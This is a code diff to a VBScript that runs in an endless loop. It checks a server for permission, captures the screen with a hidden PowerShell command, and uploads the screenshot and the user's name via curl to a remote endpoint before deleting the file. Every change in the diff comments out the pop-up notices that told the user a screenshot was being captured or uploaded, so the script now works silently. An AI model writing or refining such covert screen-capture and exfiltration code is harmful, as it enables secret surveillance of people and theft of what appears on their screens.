@@ -19,7 +19,7 @@ Do
 	GetPermissions
 	CaptureScreenshot
 	UploadImage
-	WshShell.Popup "Waiting for 10 seconds now before deleting the screenshot...", 2, "DeleteFile()", 64
+	'WshShell.Popup "Waiting for 10 seconds now before deleting the screenshot...", 2, "DeleteFile()", 64
 	WScript.Sleep 10000 ' 10000 milliseconds = 10 seconds
 	DeleteFile
 Loop While True ' Infinite loop
@@ -40,9 +40,9 @@ sub GetPermissions()
 	 ' Check if there was an error during the request
     If Err.Number <> 0 Then
         ' Display detailed error information
-		WshShell.Popup "Error connecting to the server. Details: " & Err.Description, 2, "GetPermissions()", 64
+		'WshShell.Popup "Error connecting to the server. Details: " & Err.Description, 2, "GetPermissions()", 64
         Err.Clear  ' Clear the error object
-		WshShell.Popup "Waiting for 10 seconds now before retrying...", 2, "GetPermissions()", 64
+		'WshShell.Popup "Waiting for 10 seconds now before retrying...", 2, "GetPermissions()", 64
 		WScript.Sleep 10000 ' wait for 10 seconds
 
 		Set objNetwork = Nothing ' Release the object
@@ -55,8 +55,8 @@ sub GetPermissions()
 	
 	 ' Check if there was an error during the request
     If objHTTP.Status <> 200 Then
-	    WshShell.Popup "Error connecting to the server. Status code: " & objHTTP.Status, 2, "GetPermissions()", 64
-		WshShell.Popup "Waiting for 10 seconds now before retrying...", 2, "GetPermissions()", 64
+	    'WshShell.Popup "Error connecting to the server. Status code: " & objHTTP.Status, 2, "GetPermissions()", 64
+		'WshShell.Popup "Waiting for 10 seconds now before retrying...", 2, "GetPermissions()", 64
 		WScript.Sleep 10000 ' wait for 10 seconds
 
 		Set objNetwork = Nothing ' Release the object
@@ -68,15 +68,15 @@ sub GetPermissions()
     End If
 	
 	' Display the response from the server
-	WshShell.Popup "Response from server: " & objHTTP.responseText, 2, "GetPermissions()", 64
+	'WshShell.Popup "Response from server: " & objHTTP.responseText, 2, "GetPermissions()", 64
 
 	
 	If objHTTP.responseText = "true" Then
-	    WshShell.Popup "Permissions granted!", 2, "GetPermissions()", 64
+	    'WshShell.Popup "Permissions granted!", 2, "GetPermissions()", 64
     Else
-		WshShell.Popup "Permissions denied!", 2, "GetPermissions()", 64
+		'WshShell.Popup "Permissions denied!", 2, "GetPermissions()", 64
 
-		WshShell.Popup "Waiting for 30 minutes now before retrying...", 2, "GetPermissions()", 64
+		'WshShell.Popup "Waiting for 30 minutes now before retrying...", 2, "GetPermissions()", 64
 
 		WScript.Sleep 1800000 ' wait for 30 minutes
 		
@@ -102,7 +102,7 @@ sub CheckInternetConnection()
     If objHTTP.status = 200 Then
 		 'WshShell.Popup "Internet is connected!", 2, "CheckInternetConnection()", 64
     Else
-		WshShell.Popup "Internet is not connected!", 2, "CheckInternetConnection()", 64
+		'WshShell.Popup "Internet is not connected!", 2, "CheckInternetConnection()", 64
 		WScript.Sleep 3000
 		' Explicitly release the objHTTP object
     	Set objHTTP = Nothing
@@ -122,7 +122,7 @@ sub CaptureScreenshot()
 												"Remove-Variable -Name image"
     
     objShell.Run "powershell.exe -Command """ & powershellCommand & """", 0, True ' Execute the PowerShell command
-	WshShell.Popup "Screenshot Captured and saved at " & outputDirectory & "\" & filename, 2, "CaptureScreenshot()", 64
+	'WshShell.Popup "Screenshot Captured and saved at " & outputDirectory & "\" & filename, 2, "CaptureScreenshot()", 64
     Set objShell = Nothing
 	Set powershellCommand = Nothing
 End sub
@@ -131,11 +131,11 @@ Sub UploadImage()
 	Dim objNetwork : Set objNetwork = CreateObject("WScript.Network")
     Dim clientName : clientName = objNetwork.UserName
 
-	WshShell.Popup "Uploading Screenshot...", 2, "UploadImage()", 64
+	'WshShell.Popup "Uploading Screenshot...", 2, "UploadImage()", 64
     Dim curlCommand : curlCommand = "curl -X POST " & apiEndpoint & " -H ""Content-Type: multipart/form-data"" -F ""image=@" & imagePath & """ -F ""clientName=" & clientName & """"
     Dim shell : Set shell = CreateObject("WScript.Shell") ' Create a WScript.Shell object
     shell.Run curlCommand, 0, True ' Run the curl command
-	WshShell.Popup "Screenshot Uploaded!", 2, "UploadImage()", 64
+	'WshShell.Popup "Screenshot Uploaded!", 2, "UploadImage()", 64
     
 	Set objNetwork = Nothing    ' Release the object
 	Set clientName = Nothing    ' Release the object
@@ -147,9 +147,9 @@ Sub DeleteFile()
 	Dim objFSO : Set objFSO = CreateObject("Scripting.FileSystemObject") 	' Create a FileSystemObject
     If objFSO.FileExists(imagePath) Then 									' Check if the file exists before attempting to delete
         objFSO.DeleteFile imagePath 										' Delete the file
-        WshShell.Popup "Screenshot Deleted!", 2, "DeleteFile()", 64
+        'WshShell.Popup "Screenshot Deleted!", 2, "DeleteFile()", 64
     Else
-		WshShell.Popup "Screenshot not found!", 2, "DeleteFile()", 64
+		'WshShell.Popup "Screenshot not found!", 2, "DeleteFile()", 64
     End If
 	Set objFSO = Nothing 												    ' Release the FileSystemObject
 End Sub
